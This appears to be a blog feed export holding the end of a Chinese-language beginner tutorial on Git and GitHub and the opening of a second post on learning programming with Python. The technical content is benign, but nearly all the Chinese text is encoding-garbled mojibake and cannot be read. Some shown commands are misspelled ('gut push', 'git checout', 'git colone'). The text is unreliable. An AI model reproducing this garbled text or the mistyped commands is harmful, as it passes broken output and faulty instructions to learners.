 // æ¯”è¼ƒç¾åœ¨æª”æ¡ˆå’Œä¸Šæ¬¡ commit ä¹‹é–“çš„å·®ç•°ï¼Œä¹Ÿå°±æ˜¯èªªä½ åšäº†å“ªäº›ä¿®æ”¹$ git diff// æŸ¥çœ‹ç›®å‰å·¥ä½œç‹€æ…‹$ git statusChanges not staged for commit:(use &quot;git add &lt;file&gt;...&quot; to update what will be committed)(use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory)    modified:   hello.py

 commit é€™å€‹ä¿®æ”¹æ™‚ç°¡å¯«æœƒå¯«æˆé€™æ¨£ï¼ˆ-a æ˜¯ addï¼Œ-m ç‚º message ç°¡å¯«ï¼Œå¾Œé¢æ¥è¨Šæ¯è³‡è¨Šï¼‰ï¼š
 $ git commit -a -m &quot;ä¿®æ”¹äº† hello.py&quot;

è¨»å†Š GitHub å¸³è™Ÿ
 ä»»å‹™å››ï¼šå»ºç«‹ä¸€å€‹ GitHub å¸³è™Ÿï¼Œä¸¦åœ¨ Git è¨­å®šä¸­åŠ å…¥ä½¿ç”¨è€…å¸³è™Ÿ
 åˆ°ç›®å‰ç‚ºä¸»æˆ‘å€‘ç¨‹å¼ä¸»è¦æ˜¯åœ¨æˆ‘å€‘ local å·¥ä½œç’°å¢ƒä¸­æ“ä½œï¼Œä½†é‚„è¨˜å¾—æˆ‘å€‘åœ¨ Git åŸºæœ¬è§€å¿µä¸­æœ‰æåˆ°ï¼Œgit åˆ†ç‚º local å’Œ remoteï¼Œè‹¥æ˜¯æˆ‘å€‘æƒ³è¦å’Œå…¨ä¸–ç•Œå…¶ä»–é–‹ç™¼è€…åˆä½œæˆ–æ˜¯è²¢ç»é–‹æ”¾åŸå§‹ç¢¼çš„è©±ï¼Œæˆ‘å€‘å¯ä»¥é€é github ä¾†ç•¶ä½œæˆ‘å€‘ remote å·¥ä½œç’°å¢ƒï¼Œå»ç®¡ç†æˆ‘å€‘ç¨‹å¼ç¢¼ï¼ŒåŒæ¨£çš„ä¹Ÿå¯ä»¥é€é github å¹³å°å’Œå…¶ä»–é–‹ç™¼è€…ä¸€èµ·åˆä½œï¼Œåƒèˆ‡é–‹æ”¾åŸå§‹ç¢¼çš„é–‹ç™¼ã€‚github è‹¥æ˜¯å…¬é–‹çš„ repo æ˜¯ç„¡é™åˆ¶æ•¸é‡å…è²»çš„ï¼Œä½†æ˜¯è‹¥æ˜¯æƒ³ä½¿ç”¨ private repo å¯ä»¥åƒè€ƒä»˜è²»æ–¹æ¡ˆã€‚
 // æ³¨æ„å¤§å°å¯«è¦ä¸€è‡´$ git config --global user.username &lt;ä½ çš„ github ä½¿ç”¨è€…åç¨±&gt;

 å…ˆåˆ° github.com è¨»å†Šå¸³è™Ÿï¼š
 
 
 é»é¸å³ä¸Šè§’ + ä¾†æ–°å¢ new repositoryï¼ˆæª”æ¡ˆåº«ï¼‰ï¼š
 
 è¼¸å…¥ repository nameï¼ˆä½ è¦å–çš„å°ˆæ¡ˆåç¨±ï¼‰ï¼Œæœ€å¥½è·Ÿé›»è…¦ local å°ˆæ¡ˆä¸€è‡´ï¼Œæˆ‘å€‘é€™é‚Šè¼¸å…¥ git-exampleã€‚ç„¶å¾Œè¼¸å…¥ç°¡çŸ­å°ˆæ¡ˆæè¿°ä¸¦å…ˆä¸å‹¾é¸åˆå§‹åŒ– README å’Œï¼Œä¹Ÿå…ˆä¸è¦é¸æ“‡ .gitignore å’Œ License æˆæ¬Šï¼ˆä¸ç„¶æœƒé€ æˆæœ¬åœ°ç«¯å’Œé ç«¯ä¸ä¸€è‡´æœƒéœ€è¦é¡å¤–ä¸€äº›è™•ç†ï¼‰ï¼š
 .gitignoreï¼šè¦å¿½ç•¥çš„æª”æ¡ˆæ¸…å–®ï¼Œé€™æ˜¯ç”¨ä¾†å‘Šè¨´ Gitï¼Œç•¶åœ¨åšç‰ˆæœ¬æ§åˆ¶è¨˜éŒ„çš„æ™‚å€™ï¼Œå¿½ç•¥é€™äº›æª”æ¡ˆã€‚é€šå¸¸ä¸€äº›æ©Ÿå¯†è³‡æ–™ï¼Œå¦‚è³‡æ–™åº«å¸³è™Ÿå¯†ç¢¼æˆ–æ˜¯ server IP ä½ç½®ç­‰ï¼Œè¨˜å¾—è¦åŠ å…¥ã€‚ä¹Ÿå¯ä»¥åƒè€ƒ github ä¸Šé¢çš„ä¸€äº›ç¯„æœ¬ åœ¨æ–°å¢ repository æ™‚é¸å–å°æ‡‰çš„ç¨‹å¼èªè¨€
 README.mdï¼šrepository ä»‹ç´¹å’Œä½¿ç”¨æ–¹å¼èªªæ˜ï¼ˆä¾‹å¦‚ï¼šä½¿ç”¨æ–¹æ³•ã€åƒèˆ‡å°ˆæ¡ˆæ–¹å¼ç­‰ï¼‰ï¼Œä½¿ç”¨ markdown èªæ³•æ’°å¯«ã€‚å¦å¤–é€šå¸¸æœ‰ CONTRIBUTING.md é¡å¤–èªªæ˜å¦‚ä½•åƒèˆ‡è²¢ç»ã€‚
 LICENSEï¼šå°ˆæ¡ˆä½¿ç”¨ä½•ç¨®æˆæ¬Šæ–¹å¼ï¼Œä¾‹å¦‚ï¼šMITã€BSD ç­‰
 
 æ¥è‘—æŒ‰ create æŒ‰éˆ•ï¼æ­å–œä½ æ–°å¢æˆåŠŸï¼Œå‰µå»ºäº†è‡ªå·±ç¬¬ä¸€å€‹ github repositoryï¼ˆé ç«¯æª”æ¡ˆåº«ï¼‰ï¼

å°‡ repository åšæœ¬æ©Ÿå’Œé ç«¯çš„é€£çµ
 ä»»å‹™äº”ï¼šæŠŠé›»è…¦è£¡ Localï¼ˆæœ¬åœ°ç«¯ï¼‰çš„ repositoryï¼ˆæª”æ¡ˆåº«ï¼‰å’Œ remoteï¼ˆé ç«¯ï¼‰çš„ repositoryï¼ˆæª”æ¡ˆåº«ï¼‰é€£çµèµ·ä¾†ï¼Œä¸¦ push é›»è…¦ä¸Šçš„ä¿®æ”¹
 
 å› æˆ‘å€‘å·²ç¶“åœ¨å°ˆæ¡ˆæœ‰æŠŠ hello.py ä¿®æ”¹åŠ å…¥è¿½è¹¤ä¸¦ commit åˆ° local æª”æ¡ˆåº«ï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥åƒè€ƒä¸‹æ–¹çš„æŒ‡ä»¤èªªæ˜æŠŠ remote ç¶²å€åŠ å…¥ï¼š
 // æœ¬åœ°ç«¯å°ˆæ¡ˆçŸ¥é“ origin å°æ‡‰åˆ°é ç«¯ç¶²å€$ git remote add origin &lt;remote ç¶²å€&gt;

 æ¥è€…æº–å‚™å°‡æœ¬åœ°ç«¯ç¨‹å¼ push åˆ°é ç«¯æª”æ¡ˆåº«ï¼š
 // è§€çœ‹æƒ…æ³$ git status// å°‡æœ¬åœ°ç«¯ç¨‹å¼ push åˆ°é ç«¯æª”æ¡ˆåº«$ git push -u origin masterCounting objects: 3, done.Writing objects: 100% (3/3), 239 bytes | 0 bytes/s, done.Total 3 (delta 0), reused 0 (delta 0)To https://github.com/happycodergit/git-example.git* [new branch]      master -&gt; masterBranch master set up to track remote branch master from origin.

 åƒæ•¸ -u ç­‰åŒæ–¼ --set-upstreamï¼Œè¨­å®š upstream å¯ä»¥ä½¿åˆ†æ”¯é–‹å§‹è¿½è¹¤æŒ‡å®šçš„é ç«¯åˆ†æ”¯ã€‚äº‹å¯¦ä¸Šï¼Œåªè¦åšéä¸€æ¬¡ $ git push -u &lt;remote name&gt; &lt;branch name&gt;ï¼Œä¸¦ä¸”æˆåŠŸ push å‡ºå»ï¼›æœ¬æ©Ÿç«¯çš„ master å°±æœƒè¢«è¨­å®šå»è¿½è¹¤é ç«¯çš„ &lt;remote name&gt;/&lt;branch name&gt; åˆ†æ”¯ã€‚åªè¦æˆåŠŸè¨­å®šå¥½ upstream å¾Œï¼Œç¬¬äºŒæ¬¡ä»¥å¾Œè¦ä¸Šå‚³åˆ†æ”¯æ™‚ï¼Œå°±åªéœ€è¦é€é git push å°±å¯ä»¥äº†ï¼Œä¸å¿…å†å¸¶ &lt;remote name&gt; è·Ÿ &lt;branch name&gt; ç­‰åƒæ•¸ã€‚ä¾‹å¦‚ï¼š$ git pushã€‚
 äº‹å¯¦ä¸Šï¼Œ$ git push -u origin master å¯ä»¥æ‹†è§£æˆï¼š
 $ git push origin master$ git checkout master$ git branch -u origin/master

 æ­å–œä½ æˆåŠŸæŠŠä½ çš„å°ˆæ¡ˆæ¨é€ä¸Šå» github å•¦ï¼
 

Fork å’Œ clone ä¸€å€‹ open sourceï¼ˆé–‹æºï¼‰çš„è¨ˆç•«
 ä»»å‹™å…­ï¼šå¾ GitHub.com å»ºç«‹å°ˆæ¡ˆï¼Œè¤‡æœ¬ forkï¼Œä¸¦ä¸‹è¼‰ clone åˆ°é›»è…¦ä¸Š
 é»é¸å·¦ä¸Šè§’ github icon å›åˆ°é¦–é ï¼Œæˆ‘å€‘å¾ä¸Šé¢æœå°‹æ¬„æœå°‹ reactï¼š
 
 é»é¸å³ä¸Šè§’ fork æŒ‰éˆ•ï¼Œè¤‡è£½ä¸€ä»½å°ˆæ¡ˆåˆ°æˆ‘å€‘é€™ï¼š
 
 ç­‰å¾… fork ä¸­ï¼š
 
 é»é¸å³é‚Šç¶ è‰²æŒ‰éˆ• clone download è¤‡è£½ HTTP ç¶²å€ï¼š
 
 // è¤‡è£½åˆ°æœ¬åœ°ç«¯$ git clone https://github.com/happycodergit/react.git// ç§»å‹•åˆ° react è³‡æ–™å¤¾$ cd react// åˆ‡å‡ºè‡ªå·±çš„æ–°åˆ†æ”¯ï¼ˆä½¿ç”¨ -bï¼‰$ git checkout -b happycoder@feature_branch// åšä¸€äº› README.md æª”æ¡ˆä¿®æ”¹ï¼Œç„¶å¾Œ commit åˆ°è‡ªå·± fork éä¾†çš„å°ˆæ¡ˆ$ git commit -a -m &quot;Update README&quot;$ git push origin happycoder@feature_branch

 äº‹å¯¦ä¸Šï¼Œæ¯å€‹é–‹æ”¾åŸå§‹ç¢¼éƒ½æœ‰ä»–è‡ªå·±è²¢ç»çš„æ–¹å¼ï¼Œè¨˜å¾—è¦å…ˆäº†è§£ã€‚ä¾‹å¦‚å¯ä»¥åƒè€ƒ react è²¢ç»èªªæ˜ï¼
 
 ä½ å¯ä»¥é€éå°‡è‡ªå·±çš„ä¿®æ”¹ commit åˆ°è‡ªå·± fork éä¾†çš„å°ˆæ¡ˆï¼Œç„¶å¾Œåˆ°åŸå§‹å°ˆæ¡ˆé é¢é»é¸ new pull request æŒ‰éˆ•ç™¼ pull requestï¼ˆæœƒæ¯”å°ç¨‹å¼ç¢¼çš„å·®ç•°ï¼‰ã€‚è‹¥å°æ–¹ review å®Œå¾Œæ¥å—å°±å¯ä»¥å°‡è‡ªå·±çš„ç¨‹å¼ç¢¼åˆä½µåˆ°åŸå§‹å°ˆæ¡ˆä¸­ï¼Œç‚ºé–‹æ”¾åŸå§‹ç¢¼åšå‡ºç¬¬ä¸€æ­¥è²¢ç»ï¼
 // è‹¥å®Œæˆ pull request è¨˜å¾—è®“ masterï¼ˆæˆ–æ˜¯åˆä½µé€²å»çš„ branchï¼‰ä¿æŒåŒæ­¥$ git pull upstream master

ç·´ç¿’å»ºç«‹ä¸€å€‹ feature branch
 ä»»å‹™ä¸ƒï¼šå›ä¾†åŸä¾†çš„ git-example å°ˆæ¡ˆæ–°å¢ feature branchï¼ˆåˆ†æ”¯ï¼‰
 // å»ºç«‹ä¸€å€‹åç‚º dev çš„ branch$ git checkout -b dev

 åœ¨ hello.py æœ€ä¸Šé¢å¤šåŠ ä¸€è¡Œ # hi, this is comment è¨»è§£å¾Œå­˜æª”
 // commit åˆ°æœ¬åœ°ç«¯æ›´æ–°$ git commit -a -m &quot;Init dev branch&quot;$ gut push origin dev

é‚€è«‹åˆ¥äººå’Œä½ åˆä½œ
 ä»»å‹™å…«ï¼šåœ¨å°ˆæ¡ˆæ–°å¢å¤¥ä¼´ collaborator
 åœ¨å³ä¸Šè§’é€²å…¥ setting å¯ä»¥é¸æ“‡åˆ° collaborator æ–°å¢åˆä½œè€…ï¼š
 

åˆ©ç”¨ push å’Œ pull ä¾†å’Œ GitHub.com åŒæ­¥
 ä»»å‹™ä¹ï¼šç”¨ pull ä¾†å’Œå…¶ä»– collaboratorsï¼ˆåˆä½œè€…ï¼‰åŒæ­¥æ›´æ–°ï¼Œç¢ºä¿ç¨‹å¼æ˜¯æœ€æ–°çš„ç‰ˆæœ¬
 è«‹å…¶ä»–é–‹ç™¼è€… git colone ä¸‹ä¾†ä½ çš„ git-example å°ˆæ¡ˆä¸¦ checkout åˆ° dev branchï¼Œä¸¦å®Œæˆæ–°å¢ä¸€å€‹ README.md æª”æ¡ˆå¾Œç™¼ pull request éä¾†ï¼Œè‹¥æ²’å•é¡Œå°±æŒ‰åŒæ„ä¸¦åˆä½µã€‚æˆ‘å€‘å‰‡é€é git pull ä¾†ä¿æŒæœ¬åœ°ç«¯å’Œé ç«¯ç¨‹å¼ç¢¼åŒæ­¥ï¼š
 $ git pull origin dev

Mergeï¼ˆåˆä½µï¼‰å’Œåˆªé™¤ branches
ä»»å‹™åï¼šåœ¨æœ¬æ©Ÿä¸Š merge åˆä½µä½ çš„ branchï¼ˆåˆ†æ”¯ï¼‰ï¼Œåˆªé™¤èˆŠçš„ branchï¼ˆåˆ†æ”¯ï¼‰
// ç§»å‹•åˆ° master branch$ git checout master// åˆä½µ dev åˆ° master$ git merge dev// åˆªé™¤ dev branch$ git branch -d dev// å°‡åˆä½µå¾Œçš„ master æ¨é€åˆ°é ç«¯$ git push origin master

ç¸½çµä»¥ä¸Šå°±æ˜¯ Git èˆ‡ Github ç‰ˆæœ¬æ§åˆ¶åŸºæœ¬æŒ‡ä»¤èˆ‡æ“ä½œå…¥é–€æ•™å­¸ï¼å¸Œæœ›è®€è€…å¯ä»¥å‹•æ‰‹ä¸€èµ·æ“ä½œï¼Œæ¼¸æ¼¸å°±èƒ½æ„Ÿå—åˆ° git çš„å¨åŠ›å’Œå¥½è™•ï¼ŒåŒæ™‚ä¹Ÿæœ‰èƒ½åŠ›åƒèˆ‡é–‹æ”¾åŸå§‹ç¢¼ï¼ˆopen sourceï¼‰çš„ç¤¾ç¾¤å’Œææ˜‡è‡ªå·±åœ¨è·å ´ä¸Šçš„åƒ¹å€¼ï¼Œæœæˆç‚ºä¸€å€‹çœŸæ­£çš„è»Ÿé«”å·¥ç¨‹å¸«ï¼ˆSoftware Engineerï¼‰é‚é€²ï¼
åƒè€ƒæ–‡ä»¶
30 å¤©ç²¾é€š Git ç‰ˆæœ¬æ§ç®¡
Git å®˜æ–¹ç¶²ç«™
Try Git
Git-it
GitHub Guides
å¦‚ä½•å°‡æª”æ¡ˆå¾stageç§»é™¤?
Git æ•™å­¸

ï¼ˆimage via git-scmã€qboxã€quoracdnã€ytimgã€linuxã€imgurã€martinfitzpatrickï¼‰
é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>github</tag>
        <tag>è»Ÿé«”å·¥ç¨‹å¸«</tag>
        <tag>è»Ÿé«”å·¥ç¨‹</tag>
        <tag>software engineering</tag>
        <tag>bash</tag>
        <tag>shell</tag>
        <tag>svn</tag>
        <tag>version control</tag>
        <tag>VCS</tag>
        <tag>git</tag>
        <tag>cvs</tag>
        <tag>è‡ªå­¸ç¨‹å¼å¿ƒå¾—</tag>
      </tags>
  </entry>
  <entry>
    <title>ç”¨ Python è‡ªå­¸ç¨‹å¼è¨­è¨ˆï¼šç¨‹å¼è¨­è¨ˆæ€ç¶­å…¥é–€</title>
    <url>/2017/10/05/learning-programming-and-coding-with-python-introduction/</url>
    <content><![CDATA[ 
ä»€éº¼æ˜¯ç¨‹å¼è¨­è¨ˆæ€ç¶­ï¼Ÿæœ€è¿‘å¹¾å¹´å…¨çƒåˆ®èµ·äº†ä¸€è‚¡çˆ­ç›¸å­¸ç¿’é›»è…¦ç§‘å­¸ï¼ˆComputer Scienceï¼‰å’Œç¨‹å¼è¨­è¨ˆï¼ˆProgrammingï¼‰çš„é¢¨æ°£ï¼Œä¸Šè‡³ç¸½çµ±ã€é¦–ç›¸ä¸‹è‡³å‡æ–—å°æ°‘éƒ½çˆ­ç›¸é–‹å§‹å­¸å¯«ç¨‹å¼ã€‚äº‹å¯¦ä¸Šï¼Œå­¸å¯«ç¨‹å¼æœ€é‡è¦çš„æ˜¯å­¸ç¿’é›»è…¦ç§‘å­¸èƒŒå¾Œæ€è€ƒæ–¹å¼å’Œé‚è¼¯ï¼Œå­¸ç¿’å¦‚ä½•é€éç§‘æŠ€è§£æ±ºç”Ÿæ´»ä¸Šçš„å•é¡Œã€‚æ›´é€²ä¸€æ­¥èªªï¼Œç¨‹å¼è¨­è¨ˆèˆ‡å…¶èªªæ˜¯ä¸€ç¨®ç§‘å­¸ï¼Œæ›´åå‘ä¸€ç¨®è—è¡“äººæ–‡çš„å‰µä½œèˆ‡ç§‘å­¸çš„æ··åˆé«”ã€‚ä»¥å‰ç•«å®¶æˆ–æ˜¯ä½œå®¶æ˜¯æ‹¿ç´™ç­†å‰µä½œï¼Œç¾åœ¨åªè¦æœ‰ä¸€éƒ¨é›»è…¦ï¼Œé€£ä¸Šç¶²è·¯ï¼Œå°±å¯ä»¥é€éæ•²æ‰“éµç›¤å°‡è‡ªå·±çš„å‰µæ„ä»˜è«¸å¯¦è¸ã€‚
æœ‰äººèªªï¼šç¨‹å¼è¨­è¨ˆ = æ¼”ç®—æ³• + è³‡æ–™çµæ§‹
é€™æ¨£çš„èªªæ³•ä¸èƒ½èªªéŒ¯ï¼Œäº‹å¯¦ä¸Šï¼Œå…·å‚™è‰¯å¥½è³‡æ–™çµæ§‹å’Œæ¼”ç®—æ³•ç´ é¤Šçš„ç¨‹å¼è¨­è¨ˆå¸«å¾€å¾€å¯ä»¥å¯«å‡ºå“è³ªè¼ƒå¥½çš„ç¨‹å¼ç¢¼ï¼Œä½†å¤§éƒ¨åˆ†äººçœ‹åˆ°æ¼”ç®—æ³•å’Œè³‡æ–™çµæ§‹å°±å·²ç¶“æ»¿è‡‰å•è™Ÿäº†ï¼Œæ›´åˆ¥ææ›¾ç¶“åœ¨å­¸æ ¡è¢«é€™å…©é–€èª²ç¨‹å¿ƒéˆå—æŒ«çš„å­¸ç”Ÿå€‘ã€‚æ‰€ä»¥å°æ–¼åˆå­¸è€…ä¾†èªªï¼Œæ›´æ‡‰è©²è®“ä»–äº†è§£ï¼Œäº‹å¯¦ä¸Šå­¸ç¨‹å¼è¨­è¨ˆæ€ç¶­å°±æ˜¯åœ¨å­¸ç¿’è§£æ±ºå•é¡Œçš„èƒ½åŠ›ï¼ˆä¸¦éæ¯å€‹äººéƒ½éœ€è¦æˆç‚ºç¨‹å¼è¨­è¨ˆå¸«ï¼‰ï¼š

å°‹æ‰¾ä¸¦ç™¼ç¾å•é¡Œ
é‡æ¸…ä¸¦å®šç¾©å•é¡Œ
åˆ†è§£å•é¡Œ
å°‹æ‰¾è§£æ±ºæ–¹æ³•å’Œè³‡æº
é©—è­‰å•é¡Œå’Œè§£æ±ºæ–¹å¼

å”¯æœ‰å…·å‚™é€™æ¨£è§£æ±ºå•é¡Œçš„èƒ½åŠ›ï¼Œæ‰èƒ½ç¨±å¾—ä¸ŠçœŸæ­£å­¸æœƒç¨‹å¼è¨­è¨ˆæ€ç¶­ã€‚è€Œé€™æ¨£çš„æ€è€ƒæ–¹å¼çš„è¨“ç·´æ˜¯ä¸ç®¡å°‡ä¾†åˆ°å“ªè£¡ï¼Œæ˜¯å¦æœ‰å¾äº‹ç¨‹å¼è¨­è¨ˆç›¸é—œå·¥ä½œéƒ½å—ç”¨ï¼Œé€™æ‰æ˜¯å°æ–¼å­¸ç¿’é›»è…¦ç§‘å­¸èˆ‡ç¨‹å¼è¨­è¨ˆæ€ç¶­æ­£ç¢ºçš„èªçŸ¥ã€‚
å¯«ç¨‹å¼å°±æ˜¯ä¸‹æŒ‡ä»¤è«‹é›»è…¦åšäº‹æƒ…å‰›å‰›æˆ‘å€‘åœ¨ä¸Šé¢æåˆ°ç¨‹å¼è¨­è¨ˆæ€ç¶­ä¸­æœ‰ä¸€å€‹éƒ¨åˆ†æ˜¯åˆ†è§£å•é¡Œï¼Œäº‹å¯¦ä¸Šï¼Œå¯«ç¨‹å¼åœ¨å®šç¾©å•é¡Œå¾Œï¼Œæˆ‘å€‘å¿…é ˆæŠŠå•é¡Œåˆ‡åˆ†ï¼Œå°±åƒæ˜¯é£Ÿè­œä¸€æ¨£ï¼Œä¸ç®¡æ˜¯å†è±ç››çš„æ–™ç†æˆ–æ˜¯æ»¿æ¼¢å…¨å¸­ï¼Œéƒ½æœ‰ä¸€å€‹å€‹æ­¥é©Ÿå»å®Œæˆã€‚èˆ‰ä¾‹ä¾†èªªï¼Œæˆ‘å€‘ä»Šå¤©è¦å‰µä½œä¸€é“è”¥èŠ±è›‹æˆ–èœè„¯è›‹ï¼Œæˆ‘çš„æ­¥é©Ÿæœƒæ˜¯ï¼š

æ”¾é»æ²¹
æ‰“è›‹
å¦‚æœå–œæ­¡è”¥èŠ±å¯ä»¥åŠ å…¥è”¥èŠ±ï¼Œå¦‚æœå–œæ­¡èœè„¯å¯ä»¥åŠ å…¥èœè„¯ï¼ˆç¨‹å¼è¡“èªï¼šif...else æ¢ä»¶åˆ¤æ–·ï¼‰
æ”¾å…¥å°‘è¨±é¹½å·´
ä¸­ç«å¿«ç‚’ï¼Œç¿»äº”æ¬¡é¢ï¼ˆç¨‹å¼è¡“èªï¼šfor è¿´åœˆï¼‰
ç•¶çœ‹åˆ°è›‹é¢å‘ˆç¾é‡‘é»ƒè‰²æ™‚å¯ä»¥èµ·é‹ï¼ŒçµæŸæ–™ç†ï¼ˆç¨‹å¼è¡“èªï¼šwhile è¿´åœˆï¼‰
å¥½åƒçš„è”¥èŠ±è›‹æˆ–èœè„¯è›‹ä¸Šæ¡Œ

å†å¤§ç¨‹å¼åˆ‡åˆ†å¾Œå°±è®Šæˆä¸€å€‹å€‹å°ç¨‹å¼å’ŒæŒ‡ä»¤ï¼Œå°‡ç¨‹å¼åˆ‡åˆ†æˆä¸€å€‹å€‹æ¨¡çµ„ï¼Œå†å°‡å®ƒå€‘éƒ½çµ„è£èµ·ä¾†å°±æˆæˆ‘å€‘çš„æ‡‰ç”¨ç¨‹å¼å’Œç³»çµ±ã€‚
ç¬¬ä¸€æ¬¡å­¸å¯«ç¨‹å¼ï¼Œå­¸å“ªä¸€ç¨®èªè¨€å¥½å‘¢ï¼Ÿæ—¢ç„¶ç¨‹å¼è¨­è¨ˆæ€ç¶­å¾ˆé‡è¦ï¼Œç©¶ç«Ÿç¬¬ä¸€æ¬¡å­¸å¯«ç¨‹å¼ï¼Œå­¸å“ªä¸€ç¨®èªè¨€å¥½å‘¢ï¼Ÿ
å…ˆè¬›çµè«–ï¼šPython èªæ³•å¹³æ˜“è¿‘äººï¼Œå­¸ç¿’æ›²ç·šå¹³ç·©ï¼Œæ‡‰ç”¨å»£ï¼Œå¯ä»¥å¾ˆå¿«åšå‡ºä¸€äº›è§£æ±ºç”Ÿæ´»ä¸Šå•é¡Œçš„æ‡‰ç”¨ï¼Œç´¯ç©æˆå°±æ„Ÿï¼Œé©åˆåˆå­¸è€…ã€‚ç•¶ç„¶è‹¥ä½ æ˜¯åœ‹ä¸­å°çš„å­¸ç”Ÿï¼ŒScratch ä¹‹é¡çš„æ‹–æ‹‰å¼åœ–è±¡åŒ–ç¨‹å¼èªè¨€æˆ–è¨±æ˜¯åˆé©é¸æ“‡ï¼Œä½†æˆäººä¸€èˆ¬å°æ–¼é€™ç¨®ç©å…·æ¯”è¼ƒæ’æ–¥äº›ï¼Œèªç‚ºä¸æ˜¯çœŸæ­£åœ¨å­¸å¯«ç¨‹å¼ã€‚
ä¸€èˆ¬è€Œè¨€é™¤äº†å€åˆ†é«˜ä½éšç¨‹å¼èªè¨€å¤–ï¼Œæˆ‘å€‘æœƒæŠŠç¨‹å¼èªè¨€åˆ†ç‚ºï¼š
éœæ…‹èªè¨€ï¼šåœ¨ç¨‹å¼èªè¨€ä¸­æˆ‘å€‘æœƒä½¿ç”¨è®Šæ•¸ï¼ˆvariableï¼‰å„²å­˜ç¨‹å¼çš„å€¼ï¼Œåœ¨éœæ…‹èªè¨€ä¸­éœ€è¦äº‹å…ˆå®£å‘Šè®Šæ•¸å‹æ…‹ï¼ˆtypeï¼‰ï¼Œä¹Ÿå®£å‘Šäº†å®ƒæœƒåœ¨è¨˜æ†¶é«”ä¸­ä½”æœ‰å¤šå°‘ç©ºé–“ç­‰è³‡è¨Šã€‚é›»è…¦æœƒé€éé€™äº›è³‡è¨ŠæŠŠç¨‹å¼ç·¨è­¯ï¼ˆcompileï¼‰æˆä½éšçš„æ©Ÿå™¨èªè¨€è®“é›»è…¦å¯ä»¥åŸ·è¡Œã€‚é€™æ¨£çš„è¨­è¨ˆå¯ä»¥è®“é›»è…¦åŸ·è¡Œèµ·ä¾†æ›´æœ‰æ•ˆç‡ï¼Œä½†å°æ–¼é–‹ç™¼è€…ä¾†èªªæœƒæ¯”è¼ƒç¹ç‘£ä¸€äº›ï¼ˆä¾‹å¦‚ï¼šå®£å‘Šå­—ä¸²è®Šæ•¸è¦åœ¨è®Šæ•¸å‰åŠ  string å®£å‘Šï¼‰ï¼Œä¹Ÿç”±æ–¼é¡å‹è¢«å®£å‘Šå¾Œç„¡æ³•æ”¹è®Šï¼Œæ‰€ä»¥è¢«ç¨±ç‚ºéœæ…‹èªè¨€ã€‚å¸¸è¦‹çš„éœæ…‹èªè¨€åŒ…æ‹¬ï¼šC&#x2F;C++ã€Javaã€C#ã€Goã€Swift ç­‰ï¼‰ã€‚
å‹•æ…‹èªè¨€ï¼ˆåˆç¨±ç‚º script languageï¼‰ï¼šç›¸å°æ–¼éœæ…‹èªè¨€ï¼Œå‹•æ…‹èªè¨€ä¸æœƒå¼·åˆ¶è®Šæ•¸é¡å‹å®£å‘Šï¼Œå®ƒä¸æ˜¯ä½¿ç”¨ç·¨è­¯å™¨è€Œæ˜¯ä½¿ç”¨ç›´è­¯å™¨ï¼ˆinterpreterï¼‰ä¾†è§£è­¯ã€‚å‹•æ…‹èªè¨€é›–ç„¶é–‹ç™¼å’Œæ’°å¯«ç¨‹å¼ä¸Šæ•ˆç‡è¼ƒå¿«ï¼Œä½†åŸ·è¡Œé€Ÿåº¦å¾€å¾€æ¯”éœæ…‹èªè¨€æ…¢ï¼ˆç¾åœ¨å·®è·å·²ç¶“æ…¢æ…¢è®Šå°ï¼‰ã€‚ä¸€èˆ¬å¸¸è¦‹çš„å‹•æ…‹èªè¨€åŒ…æ‹¬ï¼šPythonã€JavaScriptã€PHPã€Ruby ç­‰ï¼‰ã€‚
ä»¥ä¸‹å°±ä¾†å…ˆç°¡å–®ä»‹ç´¹å¸¸è¦‹ç¨‹å¼èªè¨€å’Œå®ƒçš„ç°¡å–®èªæ³•ç¯„ä¾‹ï¼ˆå¯ä»¥é€é repl.it å¯ä»¥å°‡ç¨‹å¼ç¢¼è²¼åœ¨ç¶²é ä¸Šå‘ˆç¾æ‰€è¦‹å³æ‰€å¾—æ•ˆæœï¼‰ï¼š

Pythonæœ¬ç³»åˆ—æ–‡ç« çš„ä¸»è§’ï¼ŒPython æ˜¯ä¸€ç¨®ç‰©ä»¶å°å‘ã€ç›´è­¯å¼çš„è·¨å¹³å°å‹•æ…‹ç¨‹å¼èªè¨€ï¼Œå®ƒåŒ…å«äº†ä¸€çµ„åŠŸèƒ½å®Œå‚™çš„æ¨™æº–åº«å’Œè±å¯Œå¥—ä»¶ç”Ÿæ…‹ç³»ï¼Œå¯ä»¥è¼•é¬†å®Œæˆå¾ˆå¤šå¸¸è¦‹çš„ä»»å‹™ï¼ˆä¾‹å¦‚ï¼šç‰©è¯ç¶²æ‡‰ç”¨é–‹ç™¼ã€éŠæˆ²ã€è®€å¯«æª”æ¡ˆã€è‡ªç„¶èªè¨€è™•ç†ã€ç¶²è·¯çˆ¬èŸ²ã€ç¶²ç«™é–‹ç™¼ã€æ©Ÿå™¨å­¸ç¿’ç­‰ï¼‰ï¼Œå› ç‚ºå®ƒå¯ä»¥å¾ˆè¼•æ˜“æ•´åˆå…¶ä»–åº•å±¤èªè¨€ï¼Œæ‰€ä»¥åˆç¨±ç‚ºè† æ°´èªè¨€ã€‚å®ƒçš„èªæ³•ç°¡å–®ï¼Œèˆ‡å…¶å®ƒå¤§å¤šæ•¸ç¨‹å¼è¨­è¨ˆèªè¨€ä½¿ç”¨å¤§æ‹¬å¼§ä¸ä¸€æ¨£ï¼Œå®ƒä½¿ç”¨ç¸®é€²ä¾†å®šç¾©èªå¥å¡Šã€‚ç”±æ–¼å…·å‚™ç°¡æ½”æ˜“å­¸ç­‰ç‰¹æ€§ï¼Œæ˜¯è¨±å¤šé–‹ç™¼è€…æ¨è–¦ Python ç‚ºåˆå­¸è€…ç¬¬ä¸€å€‹å­¸ç¿’çš„ç¨‹å¼èªè¨€ã€‚ç”±æ–¼ç‰ˆæœ¬æ›´è¿­ï¼Œæˆ‘å€‘æ¥ä¸‹ä¾†è¨è«–çš„ä¸»è¦æ˜¯ä»¥ Python3 ç‚ºä¸»ã€‚ä»¥ä¸‹æ˜¯ä½¿ç”¨ Python å°å‡ºæœ€å–œæ­¡çš„èªè¨€ï¼š
